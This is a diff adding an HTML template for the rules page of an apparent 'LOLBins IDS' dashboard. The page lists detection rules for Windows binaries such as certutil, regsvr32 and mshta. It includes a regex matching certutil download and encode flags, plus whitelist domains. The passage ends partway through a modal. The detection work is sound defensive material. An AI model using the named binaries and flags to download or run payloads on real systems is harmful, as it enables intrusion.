@@ -1,0 +1,1328 @@
+<!-- templates/rules.html -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LOLBins IDS | Detection Rules</title>
+    <!-- Bootstrap CSS -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
+    <!-- Font Awesome -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <!-- Same style as the dashboard -->
+    <style>
+        :root {
+            --primary: #2c3e50;
+            --secondary: #34495e;
+            --accent: #3498db;
+            --danger: #e74c3c;
+            --warning: #f39c12;
+            --success: #2ecc71;
+            --info: #3498db;
+            --light-bg: #ecf0f1;
+            --dark-bg: #1a1a1a;
+            --card-bg: #2c3e50;
+            --text-light: #ecf0f1;
+            --text-dark: #2c3e50;
+            --border-radius: 8px;
+        }
+        
+        body {
+            font-family: 'Segoe UI', 'Roboto', sans-serif;
+            background-color: var(--dark-bg);
+            color: var(--text-light);
+        }
+        
+        /* Sidebar */
+        .sidebar {
+            background-color: var(--secondary);
+            min-height: 100vh;
+            position: fixed;
+            left: 0;
+            top: 0;
+            width: 250px;
+            z-index: 1000;
+            transition: all 0.3s;
+            box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
+        }
+        
+        .sidebar-header {
+            padding: 20px 15px;
+            background-color: var(--primary);
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .sidebar-brand {
+            color: var(--text-light);
+            font-size: 1.5rem;
+            font-weight: 600;
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+        }
+        
+        .sidebar-brand i {
+            margin-right: 10px;
+            color: var(--accent);
+        }
+        
+        .sidebar-menu {
+            padding: 15px 0;
+        }
+        
+        .menu-header {
+            color: rgba(255, 255, 255, 0.5);
+            padding: 10px 25px;
+            font-size: 0.8rem;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-top: 10px;
+        }
+        
+        .sidebar-link {
+            display: flex;
+            align-items: center;
+            color: rgba(255, 255, 255, 0.7);
+            padding: 12px 25px;
+            text-decoration: none;
+            transition: all 0.3s;
+            border-left: 3px solid transparent;
+        }
+        
+        .sidebar-link i {
+            margin-right: 10px;
+            font-size: 1.1rem;
+            width: 20px;
+            text-align: center;
+        }
+        
+        .sidebar-link.active {
+            color: var(--text-light);
+            background-color: rgba(0, 0, 0, 0.1);
+            border-left: 3px solid var(--accent);
+        }
+        
+        .sidebar-link:hover {
+            color: var(--text-light);
+            background-color: rgba(0, 0, 0, 0.2);
+        }
+        
+        /* Main content */
+        .main-content {
+            margin-left: 250px;
+            padding: 20px;
+            transition: all 0.3s;
+        }
+        
+        /* Header */
+        .header {
+            background-color: var(--primary);
+            padding: 15px 20px;
+            border-radius: var(--border-radius);
+            margin-bottom: 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .header h1 {
+            font-size: 1.5rem;
+            margin: 0;
+        }
+        
+        .header-actions {
+            display: flex;
+            align-items: center;
+        }
+        
+        .header-actions .btn {
+            margin-left: 10px;
+        }
+        
+        /* Cards */
+        .card {
+            background-color: var(--card-bg);
+            border: none;
+            border-radius: var(--border-radius);
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            margin-bottom: 20px;
+            color: var(--text-light);
+        }
+        
+        .card-header {
+            background-color: rgba(0, 0, 0, 0.1);
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+            padding: 15px 20px;
+            font-weight: 600;
+        }
+        
+        .card-body {
+            padding: 20px;
+        }
+        
+        /* Tables */
+        .table {
+            color: var(--text-light);
+            margin-bottom: 0;
+        }
+        
+        .table thead th {
+            background-color: rgba(0, 0, 0, 0.2);
+            border-bottom: none;
+            color: rgba(255, 255, 255, 0.7);
+            font-weight: 600;
+            text-transform: uppercase;
+            font-size: 0.8rem;
+            letter-spacing: 0.5px;
+        }
+        
+        .table-dark {
+            background-color: var(--secondary);
+        }
+        
+        .table tbody td {
+            border-color: rgba(255, 255, 255, 0.05);
+            padding: 12px 15px;
+            vertical-align: middle;
+        }
+        
+        .table tbody tr:hover {
+            background-color: rgba(255, 255, 255, 0.05);
+        }
+        
+        /* Severity badges */
+        .severity-badge {
+            width: 30px;
+            height: 30px;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 50%;
+            color: white;
+            font-weight: bold;
+        }
+        
+        .severity-1 { background-color: #3498db; } /* Low */
+        .severity-2 { background-color: #2ecc71; } /* Medium-Low */
+        .severity-3 { background-color: #f39c12; } /* Medium */
+        .severity-4 { background-color: #e67e22; } /* Medium-High */
+        .severity-5 { background-color: #e74c3c; } /* High */
+        
+        /* Rules related styles */
+        .rule-category {
+            margin-bottom: 10px;
+            font-size: 0.85rem;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            display: inline-block;
+            padding: 4px 8px;
+            border-radius: 4px;
+            background-color: rgba(255, 255, 255, 0.1);
+        }
+        
+        .rule-status {
+            display: inline-block;
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            margin-right: 6px;
+        }
+        
+        .rule-status.active {
+            background-color: var(--success);
+        }
+        
+        .rule-status.disabled {
+            background-color: var(--danger);
+        }
+        
+        .rule-editor {
+            background-color: rgba(0, 0, 0, 0.2);
+            border-radius: var(--border-radius);
+            padding: 20px;
+            margin-top: 20px;
+        }
+        
+        .form-control, .form-select {
+            background-color: #1e2b38;
+            border-color: rgba(255, 255, 255, 0.1);
+            color: var(--text-light);
+        }
+        
+        .form-control:focus, .form-select:focus {
+            background-color: #1e2b38;
+            border-color: var(--accent);
+            color: var(--text-light);
+            box-shadow: 0 0 0 0.25rem rgba(52, 152, 219, 0.25);
+        }
+        
+        .tab-content {
+            padding: 20px;
+            background-color: rgba(0, 0, 0, 0.1);
+            border-radius: 0 0 var(--border-radius) var(--border-radius);
+        }
+        
+        .nav-tabs {
+            border-bottom: none;
+        }
+        
+        .nav-tabs .nav-link {
+            color: rgba(255, 255, 255, 0.7);
+            border: none;
+            border-radius: var(--border-radius) var(--border-radius) 0 0;
+            background-color: rgba(0, 0, 0, 0.2);
+            margin-right: 5px;
+        }
+        
+        .nav-tabs .nav-link.active {
+            color: var(--text-light);
+            background-color: rgba(0, 0, 0, 0.1);
+        }
+        
+        /* Search bar in header */
+        .search-bar {
+            position: relative;
+            max-width: 300px;
+        }
+        
+        .search-bar .form-control {
+            padding-left: 40px;
+            background-color: rgba(0, 0, 0, 0.2);
+            border: none;
+        }
+        
+        .search-bar .search-icon {
+            position: absolute;
+            left: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: rgba(255, 255, 255, 0.5);
+        }
+        
+        /* Modal */
+        .modal-content {
+            background-color: var(--secondary);
+            color: var(--text-light);
+        }
+        
+        .modal-header {
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .modal-footer {
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        /* Media queries */
+        @media (max-width: 991.98px) {
+            .sidebar {
+                width: 80px;
+            }
+            
+            .sidebar-brand span, .sidebar-link span, .menu-header {
+                display: none;
+            }
+            
+            .sidebar-brand i, .sidebar-link i {
+                margin-right: 0;
+                font-size: 1.3rem;
+            }
+            
+            .sidebar-link {
+                justify-content: center;
+                padding: 15px;
+            }
+            
+            .main-content {
+                margin-left: 80px;
+            }
+        }
+        
+        @media (max-width: 767.98px) {
+            .main-content {
+                margin-left: 0;
+                padding: 15px;
+            }
+            
+            .sidebar {
+                transform: translateX(-100%);
+            }
+            
+            .sidebar.show {
+                transform: translateX(0);
+            }
+            
+            .mobile-menu-toggle {
+                display: block;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Sidebar - Same as dashboard -->
+    <div class="sidebar">
+        <div class="sidebar-header">
+            <a href="/" class="sidebar-brand">
+                <i class="fas fa-shield-alt"></i>
+                <span>LOLBins IDS</span>
+            </a>
+        </div>
+        <div class="sidebar-menu">
+            <div class="menu-header">Monitoring</div>
+            <a href="/dashboard" class="sidebar-link">
+                <i class="fas fa-tachometer-alt"></i>
+                <span>Dashboard</span>
+            </a>
+            <a href="/alerts" class="sidebar-link">
+                <i class="fas fa-exclamation-triangle"></i>
+                <span>Alerts</span>
+            </a>
+            <a href="/analytics" class="sidebar-link">
+                <i class="fas fa-chart-line"></i>
+                <span>Analytics</span>
+            </a>
+            
+            <div class="menu-header">Management</div>
+            <a href="/settings" class="sidebar-link">
+                <i class="fas fa-cog"></i>
+                <span>Settings</span>
+            </a>
+            <a href="/reports" class="sidebar-link">
+                <i class="fas fa-file-alt"></i>
+                <span>Reports</span>
+            </a>
+            <a href="/rules" class="sidebar-link active">
+                <i class="fas fa-list-check"></i>
+                <span>Rules</span>
+            </a>
+            <a href="/whitelist" class="sidebar-link">
+                <i class="fas fa-shield-halved"></i>
+                <span>Whitelist</span>
+            </a>
+            
+            <div class="menu-header">System</div>
+            <a href="/about" class="sidebar-link">
+                <i class="fas fa-info-circle"></i>
+                <span>About</span>
+            </a>
+            <a href="/logout" class="sidebar-link">
+                <i class="fas fa-sign-out-alt"></i>
+                <span>Logout</span>
+            </a>
+        </div>
+    </div>
+
+    <!-- Main content -->
+    <div class="main-content">
+        <!-- Header -->
+        <div class="header">
+            <h1>Detection Rules</h1>
+            <div class="header-actions">
+                <div class="search-bar me-2">
+                    <i class="fas fa-search search-icon"></i>
+                    <input type="text" class="form-control" placeholder="Search rules...">
+                </div>
+                <button class="btn btn-primary" data-bs-toggle="modal" data-bs-target="#newRuleModal">
+                    <i class="fas fa-plus me-1"></i> New Rule
+                </button>
+            </div>
+        </div>
+
+        <!-- Rules overview -->
+        <div class="row mb-4">
+            <div class="col-md-3">
+                <div class="card">
+                    <div class="card-body text-center">
+                        <h3 class="mb-0" id="totalRules">7</h3>
+                        <p class="text-muted mb-0">Total Rules</p>
+                    </div>
+                </div>
+            </div>
+            <div class="col-md-3">
+                <div class="card">
+                    <div class="card-body text-center">
+                        <h3 class="mb-0" id="activeRules">7</h3>
+                        <p class="text-muted mb-0">Active Rules</p>
+                    </div>
+                </div>
+            </div>
+            <div class="col-md-3">
+                <div class="card">
+                    <div class="card-body text-center">
+                        <h3 class="mb-0" id="highSeverityRules">2</h3>
+                        <p class="text-muted mb-0">High Severity Rules</p>
+                    </div>
+                </div>
+            </div>
+            <div class="col-md-3">
+                <div class="card">
+                    <div class="card-body text-center">
+                        <h3 class="mb-0" id="customRules">0</h3>
+                        <p class="text-muted mb-0">Custom Rules</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Rules filters -->
+        <div class="card mb-4">
+            <div class="card-body">
+                <div class="row g-2">
+                    <div class="col-md-3">
+                        <label for="lolbinFilter" class="form-label">LOLBin</label>
+                        <select id="lolbinFilter" class="form-select">
+                            <option value="all">All LOLBins</option>
+                            <option value="certutil.exe">certutil.exe</option>
+                            <option value="powershell.exe">powershell.exe</option>
+                            <option value="regsvr32.exe">regsvr32.exe</option>
+                            <option value="mshta.exe">mshta.exe</option>
+                            <option value="wmic.exe">wmic.exe</option>
+                            <option value="bitsadmin.exe">bitsadmin.exe</option>
+                            <option value="msbuild.exe">msbuild.exe</option>
+                        </select>
+                    </div>
+                    <div class="col-md-3">
+                        <label for="severityFilter" class="form-label">Severity</label>
+                        <select id="severityFilter" class="form-select">
+                            <option value="all">All Severities</option>
+                            <option value="5">High (5)</option>
+                            <option value="4">Medium-High (4)</option>
+                            <option value="3">Medium (3)</option>
+                            <option value="2">Low-Medium (2)</option>
+                            <option value="1">Low (1)</option>
+                        </select>
+                    </div>
+                    <div class="col-md-3">
+                        <label for="statusFilter" class="form-label">Status</label>
+                        <select id="statusFilter" class="form-select">
+                            <option value="all">All Status</option>
+                            <option value="active">Active</option>
+                            <option value="disabled">Disabled</option>
+                        </select>
+                    </div>
+                    <div class="col-md-3">
+                        <label for="typeFilter" class="form-label">Rule Type</label>
+                        <select id="typeFilter" class="form-select">
+                            <option value="all">All Types</option>
+                            <option value="default">Default</option>
+                            <option value="custom">Custom</option>
+                        </select>
+                    </div>
+                </div>
+                <div class="row mt-3">
+                    <div class="col-12 d-flex justify-content-end">
+                        <button id="applyFiltersBtn" class="btn btn-primary">
+                            <i class="fas fa-filter me-1"></i> Apply Filters
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Rules table -->
+        <div class="card">
+            <div class="card-body p-0">
+                <div class="table-responsive">
+                    <table class="table table-dark">
+                        <thead>
+                            <tr>
+                                <th>Status</th>
+                                <th>Rule Name</th>
+                                <th>LOLBin</th>
+                                <th>Severity</th>
+                                <th>Type</th>
+                                <th>Actions</th>
+                            </tr>
+                        </thead>
+                        <tbody id="rulesTable">
+                            <!-- CertUtil Download -->
+                            <tr>
+                                <td>
+                                    <span class="rule-status active" title="Active"></span>
+                                    <span>Active</span>
+                                </td>
+                                <td>CertUtil Download</td>
+                                <td>certutil.exe</td>
+                                <td>
+                                    <span class="severity-badge severity-4">4</span>
+                                </td>
+                                <td>
+                                    <span class="rule-category">Default</span>
+                                </td>
+                                <td>
+                                    <button class="btn btn-sm btn-outline-primary me-1" data-bs-toggle="modal" data-bs-target="#editRuleModal" onclick="editRule('CertUtil Download')">
+                                        <i class="fas fa-edit"></i>
+                                    </button>
+                                    <button class="btn btn-sm btn-outline-warning me-1" onclick="toggleRule('CertUtil Download', false)">
+                                        <i class="fas fa-ban"></i>
+                                    </button>
+                                    <button class="btn btn-sm btn-outline-info" data-bs-toggle="modal" data-bs-target="#ruleDetailModal" onclick="viewRuleDetails('CertUtil Download')">
+                                        <i class="fas fa-eye"></i>
+                                    </button>
+                                </td>
+                            </tr>
+                            
+                            <!-- Regsvr32 AppLocker Bypass -->
+                            <tr>
+                                <td>
+                                    <span class="rule-status active" title="Active"></span>
+                                    <span>Active</span>
+                                </td>
+                                <td>Regsvr32 AppLocker Bypass</td>
+                                <td>regsvr32.exe</td>
+                                <td>
+                                    <span class="severity-badge severity-5">5</span>
+                                </td>
+                                <td>
+                                    <span class="rule-category">Default</span>
+                                </td>
+                                <td>
+                                    <button class="btn btn-sm btn-outline-primary me-1" data-bs-toggle="modal" data-bs-target="#editRuleModal" onclick="editRule('Regsvr32 AppLocker Bypass')">
+                                        <i class="fas fa-edit"></i>
+                                    </button>
+                                    <button class="btn btn-sm btn-outline-warning me-1" onclick="toggleRule('Regsvr32 AppLocker Bypass', false)">
+                                        <i class="fas fa-ban"></i>
+                                    </button>
+                                    <button class="btn btn-sm btn-outline-info" data-bs-toggle="modal" data-bs-target="#ruleDetailModal" onclick="viewRuleDetails('Regsvr32 AppLocker Bypass')">
+                                        <i class="fas fa-eye"></i>
+                                    </button>
+                                </td>
+                            </tr>
+                            
+                            <!-- PowerShell Encoded Command -->
+                            <tr>
+                                <td>
+                                    <span class="rule-status active" title="Active"></span>
+                                    <span>Active</span>
+                                </td>
+                                <td>PowerShell Encoded Command</td>
+                                <td>powershell.exe</td>
+                                <td>
+                                    <span class="severity-badge severity-4">4</span>
+                                </td>
+                                <td>
+                                    <span class="rule-category">Default</span>
+                                </td>
+                                <td>
+                                    <button class="btn btn-sm btn-outline-primary me-1" data-bs-toggle="modal" data-bs-target="#editRuleModal" onclick="editRule('PowerShell Encoded Command')">
+                                        <i class="fas fa-edit"></i>
+                                    </button>
+                                    <button class="btn btn-sm btn-outline-warning me-1" onclick="toggleRule('PowerShell Encoded Command', false)">
+                                        <i class="fas fa-ban"></i>
+                                    </button>
+                                    <button class="btn btn-sm btn-outline-info" data-bs-toggle="modal" data-bs-target="#ruleDetailModal" onclick="viewRuleDetails('PowerShell Encoded Command')">
+                                        <i class="fas fa-eye"></i>
+                                    </button>
+                                </td>
+                            </tr>
+                            
+                            <!-- WMIC Process Creation -->
+                            <tr>
+                                <td>
+                                    <span class="rule-status active" title="Active"></span>
+                                    <span>Active</span>
+                                </td>
+                                <td>WMIC Process Creation</td>
+                                <td>wmic.exe</td>
+                                <td>
+                                    <span class="severity-badge severity-3">3</span>
+                                </td>
+                                <td>
+                                    <span class="rule-category">Default</span>
+                                </td>
+                                <td>
+                                    <button class="btn btn-sm btn-outline-primary me-1" data-bs-toggle="modal" data-bs-target="#editRuleModal" onclick="editRule('WMIC Process Creation')">
+                                        <i class="fas fa-edit"></i>
+                                    </button>
+                                    <button class="btn btn-sm btn-outline-warning me-1" onclick="toggleRule('WMIC Process Creation', false)">
+                                        <i class="fas fa-ban"></i>
+                                    </button>
+                                    <button class="btn btn-sm btn-outline-info" data-bs-toggle="modal" data-bs-target="#ruleDetailModal" onclick="viewRuleDetails('WMIC Process Creation')">
+                                        <i class="fas fa-eye"></i>
+                                    </button>
+                                </td>
+                            </tr>
+                            
+                            <!-- BITSAdmin File Transfer -->
+                            <tr>
+                                <td>
+                                    <span class="rule-status active" title="Active"></span>
+                                    <span>Active</span>
+                                </td>
+                                <td>BITSAdmin File Transfer</td>
+                                <td>bitsadmin.exe</td>
+                                <td>
+                                    <span class="severity-badge severity-3">3</span>
+                                </td>
+                                <td>
+                                    <span class="rule-category">Default</span>
+                                </td>
+                                <td>
+                                    <button class="btn btn-sm btn-outline-primary me-1" data-bs-toggle="modal" data-bs-target="#editRuleModal" onclick="editRule('BITSAdmin File Transfer')">
+                                        <i class="fas fa-edit"></i>
+                                    </button>
+                                    <button class="btn btn-sm btn-outline-warning me-1" onclick="toggleRule('BITSAdmin File Transfer', false)">
+                                        <i class="fas fa-ban"></i>
+                                    </button>
+                                    <button class="btn btn-sm btn-outline-info" data-bs-toggle="modal" data-bs-target="#ruleDetailModal" onclick="viewRuleDetails('BITSAdmin File Transfer')">
+                                        <i class="fas fa-eye"></i>
+                                    </button>
+                                </td>
+                            </tr>
+                            
+                            <!-- MSBuild Inline Task -->
+                            <tr>
+                                <td>
+                                    <span class="rule-status active" title="Active"></span>
+                                    <span>Active</span>
+                                </td>
+                                <td>MSBuild Inline Task</td>
+                                <td>msbuild.exe</td>
+                                <td>
+                                    <span class="severity-badge severity-4">4</span>
+                                </td>
+                                <td>
+                                    <span class="rule-category">Default</span>
+                                </td>
+                                <td>
+                                    <button class="btn btn-sm btn-outline-primary me-1" data-bs-toggle="modal" data-bs-target="#editRuleModal" onclick="editRule('MSBuild Inline Task')">
+                                        <i class="fas fa-edit"></i>
+                                    </button>
+                                    <button class="btn btn-sm btn-outline-warning me-1" onclick="toggleRule('MSBuild Inline Task', false)">
+                                        <i class="fas fa-ban"></i>
+                                    </button>
+                                    <button class="btn btn-sm btn-outline-info" data-bs-toggle="modal" data-bs-target="#ruleDetailModal" onclick="viewRuleDetails('MSBuild Inline Task')">
+                                        <i class="fas fa-eye"></i>
+                                    </button>
+                                </td>
+                            </tr>
+                            
+                            <!-- MSHTA Suspicious Execution -->
+                            <tr>
+                                <td>
+                                    <span class="rule-status active" title="Active"></span>
+                                    <span>Active</span>
+                                </td>
+                                <td>MSHTA Suspicious Execution</td>
+                                <td>mshta.exe</td>
+                                <td>
+                                    <span class="severity-badge severity-4">4</span>
+                                </td>
+                                <td>
+                                    <span class="rule-category">Default</span>
+                                </td>
+                                <td>
+                                    <button class="btn btn-sm btn-outline-primary me-1" data-bs-toggle="modal" data-bs-target="#editRuleModal" onclick="editRule('MSHTA Suspicious Execution')">
+                                        <i class="fas fa-edit"></i>
+                                    </button>
+                                    <button class="btn btn-sm btn-outline-warning me-1" onclick="toggleRule('MSHTA Suspicious Execution', false)">
+                                        <i class="fas fa-ban"></i>
+                                    </button>
+                                    <button class="btn btn-sm btn-outline-info" data-bs-toggle="modal" data-bs-target="#ruleDetailModal" onclick="viewRuleDetails('MSHTA Suspicious Execution')">
+                                        <i class="fas fa-eye"></i>
+                                    </button>
+                                </td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Edit Rule Modal -->
+    <div class="modal fade" id="editRuleModal" tabindex="-1" aria-labelledby="editRuleModalLabel" aria-hidden="true">
+        <div class="modal-dialog modal-lg">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <h5 class="modal-title" id="editRuleModalLabel">Edit Rule</h5>
+                    <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal" aria-label="Close"></button>
+                </div>
+                <div class="modal-body">
+                    <form id="editRuleForm">
+                        <div class="mb-3">
+                            <label for="editRuleName" class="form-label">Rule Name</label>
+                            <input type="text" class="form-control" id="editRuleName" value="CertUtil Download">
+                        </div>
+                        <div class="mb-3">
+                            <label for="editRuleDescription" class="form-label">Description</label>
+                            <textarea class="form-control" id="editRuleDescription" rows="2">CertUtil used to download files from internet</textarea>
+                        </div>
+                        <div class="row mb-3">
+                            <div class="col-md-6">
+                                <label for="editRuleLolbin" class="form-label">LOLBin</label>
+                                <select class="form-select" id="editRuleLolbin">
+                                    <option value="certutil.exe" selected>certutil.exe</option>
+                                    <option value="powershell.exe">powershell.exe</option>
+                                    <option value="regsvr32.exe">regsvr32.exe</option>
+                                    <option value="mshta.exe">mshta.exe</option>
+                                    <option value="wmic.exe">wmic.exe</option>
+                                    <option value="bitsadmin.exe">bitsadmin.exe</option>
+                                    <option value="msbuild.exe">msbuild.exe</option>
+                                </select>
+                            </div>
+                            <div class="col-md-6">
+                                <label for="editRuleSeverity" class="form-label">Severity</label>
+                                <select class="form-select" id="editRuleSeverity">
+                                    <option value="1">Low (1)</option>
+                                    <option value="2">Medium-Low (2)</option>
+                                    <option value="3">Medium (3)</option>
+                                    <option value="4" selected>Medium-High (4)</option>
+                                    <option value="5">High (5)</option>
+                                </select>
+                            </div>
+                        </div>
+                        <div class="mb-3">
+                            <label for="editRulePattern" class="form-label">Detection Pattern (Regular Expression)</label>
+                            <input type="text" class="form-control" id="editRulePattern" value="(urlcache|-urlcache|-f|-split|-encode|-decode)">
+                            <div class="form-text text-white-50">Regular expression pattern to match in command line arguments</div>
+                        </div>
+                        
+                        <div class="mb-3">
+                            <label class="form-label">Context Awareness</label>
+                            <div class="rule-editor">
+                                <div class="mb-3">
+                                    <div class="form-check form-switch">
+                                        <input class="form-check-input" type="checkbox" id="contextAwarenessToggle">
+                                        <label class="form-check-label" for="contextAwarenessToggle">Enable Context Awareness</label>
+                                    </div>
+                                </div>
+                                <div id="contextAwarenessOptions" style="display: none;">
+                                    <div class="mb-3">
+                                        <label class="form-label">Required Process Context</label>
+                                        <select class="form-select" id="contextProcesses" multiple>
+                                            <option value="cmd.exe">cmd.exe</option>
+                                            <option value="powershell.exe">powershell.exe</option>
+                                            <option value="wscript.exe">wscript.exe</option>
+                                            <option value="explorer.exe">explorer.exe</option>
+                                        </select>
+                                        <div class="form-text text-white-50">Select processes that should be running to increase detection confidence</div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div class="mb-3">
+                            <label class="form-label">Whitelist Patterns</label>
+                            <div class="rule-editor">
+                                <div class="mb-3">
+                                    <input type="text" class="form-control mb-2" placeholder="Add whitelist pattern..." id="whitelistPatternInput">
+                                    <button type="button" class="btn btn-outline-light btn-sm" id="addWhitelistPattern">
+                                        <i class="fas fa-plus me-1"></i> Add Pattern
+                                    </button>
+                                </div>
+                                <div class="mb-3">
+                                    <div id="whitelistPatterns" class="d-flex flex-wrap gap-2">
+                                        <span class="badge bg-secondary p-2">
+                                            \.microsoft\.com
+                                            <button type="button" class="btn-close btn-close-white ms-2" style="font-size: 0.5rem;"></button>
+                                        </span>
+                                        <span class="badge bg-secondary p-2">
+                                            \.windows\.com
+                                            <button type="button" class="btn-close btn-close-white ms-2" style="font-size: 0.5rem;"></button>
+                                        </span>
+                                        <span class="badge bg-secondary p-2">
+                                            \.windowsupdate\.com
+                                            <button type="button" class="btn-close btn-close-white ms-2" style="font-size: 0.5rem;"></button>
+                                        </span>
+                                        <span class="badge bg-secondary p-2">
+                                            certificate\.crt$
+                                            <button type="button" class="btn-close btn-close-white ms-2" style="font-size: 0.5rem;"></button>
+                                        </span>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </form>
+                </div>
+                <div class="modal-footer">
+                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button>
+                    <button type="button" class="btn btn-primary" id="saveRuleBtn">Save Changes</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- New Rule Modal -->
+    <div class="modal fade" id="newRuleModal" tabindex="-1" aria-labelledby="newRuleModalLabel" aria-hidden="true">
+        <div class="modal-dialog modal-lg">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <h5 class="modal-title" id="newRuleModalLabel">Create New Rule</h5>
+                    <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal" aria-label="Close"></button>
+                </div>
+                <div class="modal-body">
+                    <form id="newRuleForm">
+                        <div class="mb-3">
+                            <label for="newRuleName" class="form-label">Rule Name</label>
+                            <input type="text" class="form-control" id="newRuleName" placeholder="Enter rule name">
+                        </div>
+                        <div class="mb-3">
+                            <label for="newRuleDescription" class="form-label">Description</label>
+                            <textarea class="form-control" id="newRuleDescription" rows="2" placeholder="Describe the suspicious activity this rule detects"></textarea>
+                        </div>
+                        <div class="row mb-3">
+                            <div class="col-md-6">
+                                <label for="newRuleLolbin" class="form-label">LOLBin</label>
+                                <select class="form-select" id="newRuleLolbin">
+                                    <option value="" selected disabled>Select LOLBin</option>
+                                    <option value="certutil.exe">certutil.exe</option>
+                                    <option value="powershell.exe">powershell.exe</option>
+                                    <option value="regsvr32.exe">regsvr32.exe</option>
+                                    <option value="mshta.exe">mshta.exe</option>
+                                    <option value="wmic.exe">wmic.exe</option>
+                                    <option value="bitsadmin.exe">bitsadmin.exe</option>
+                                    <option value="msbuild.exe">msbuild.exe</option>
+                                    <option value="other">Other (Custom)</option>
+                                </select>
+                            </div>
+                            <div class="col-md-6" id="customLolbinField" style="display: none;">
+                                <label for="customLolbin" class="form-label">Custom LOLBin</label>
+                                <input type="text" class="form-control" id="customLolbin" placeholder="Enter binary name (e.g., example.exe)">
+                            </div>
+                        </div>
+                        <div class="row mb-3">
+                            <div class="col-md-6">
+                                <label for="newRuleSeverity" class="form-label">Severity</label>
+                                <select class="form-select" id="newRuleSeverity">
+                                    <option value="1">Low (1)</option>
+                                    <option value="2">Medium-Low (2)</option>
+                                    <option value="3" selected>Medium (3)</option>
+                                    <option value="4">Medium-High (4)</option>
+                                    <option value="5">High (5)</option>
+                                </select>
+                            </div>
+                        </div>
+                        <div class="mb-3">
+                            <label for="newRulePattern" class="form-label">Detection Pattern (Regular Expression)</label>
+                            <input type="text" class="form-control" id="newRulePattern" placeholder="Enter regex pattern to match in command line">
+                            <div class="form-text text-white-50">Example: (download|install|exec|run)</div>
+                        </div>
+                        
+                        <div class="mb-3">
+                            <label class="form-label">Context Awareness</label>
+                            <div class="rule-editor">
+                                <div class="mb-3">
+                                    <div class="form-check form-switch">
+                                        <input class="form-check-input" type="checkbox" id="newContextAwarenessToggle">
+                                        <label class="form-check-label" for="newContextAwarenessToggle">Enable Context Awareness</label>
+                                    </div>
+                                </div>
+                                <div id="newContextAwarenessOptions" style="display: none;">
+                                    <div class="mb-3">
+                                        <label class="form-label">Required Process Context</label>
+                                        <select class="form-select" id="newContextProcesses" multiple>
+                                            <option value="cmd.exe">cmd.exe</option>
+                                            <option value="powershell.exe">powershell.exe</option>
+                                            <option value="wscript.exe">wscript.exe</option>
+                                            <option value="explorer.exe">explorer.exe</option>
+                                        </select>
+                                        <div class="form-text text-white-50">Select processes that should be running to increase detection confidence</div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div class="mb-3">
+                            <label class="form-label">Whitelist Patterns</label>
+                            <div class="rule-editor">
+                                <div class="mb-3">
+                                    <input type="text" class="form-control mb-2" placeholder="Add whitelist pattern..." id="newWhitelistPatternInput">
+                                    <button type="button" class="btn btn-outline-light btn-sm" id="newAddWhitelistPattern">
+                                        <i class="fas fa-plus me-1"></i> Add Pattern
+                                    </button>
+                                </div>
+                                <div class="mb-3">
+                                    <div id="newWhitelistPatterns" class="d-flex flex-wrap gap-2">
+                                        <!-- Whitelist patterns will be added here -->
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </form>
+                </div>
+                <div class="modal-footer">
+                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button>
+                    <button type="button" class="btn btn-primary" id="createRuleBtn">Create Rule</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Rule Detail Modal -->
+    <div class="modal fade" id="ruleDetailModal" tabindex="-1" aria-labelledby="ruleDetailModalLabel" aria-hidden="true">
+        <div class="modal-dialog modal-lg">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <h5 class="modal-title" id="ruleDetailModalLabel">Rule Details</h5>
+                    <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal" aria-label="Close"></button>
+                </div>
+                <div class="modal-body">
+                    <ul class="nav nav-tabs" id="ruleDetailTabs" role="tablist">
+                        <li class="nav-item" role="presentation">
+                            <button class="nav-link active" id="overview-tab" data-bs-toggle="tab" data-bs-target="#overview" type="button" role="tab" aria-controls="overview" aria-selected="true">Overview</button>
+                        </li>
+                        <li class="nav-item" role="presentation">
+                            <button class="nav-link" id="pattern-tab" data-bs-toggle="tab" data-bs-target="#pattern" type="button" role="tab" aria-controls="pattern" aria-selected="false">Pattern</button>
+                        </li>
+                        <li class="nav-item" role="presentation">
+                            <button class="nav-link" id="whitelist-tab" data-bs-toggle="tab" data-bs-target="#whitelist" type="button" role="tab" aria-controls="whitelist" aria-selected="false">Whitelist</button>
+                        </li>
+                        <li class="nav-item" role="presentation">
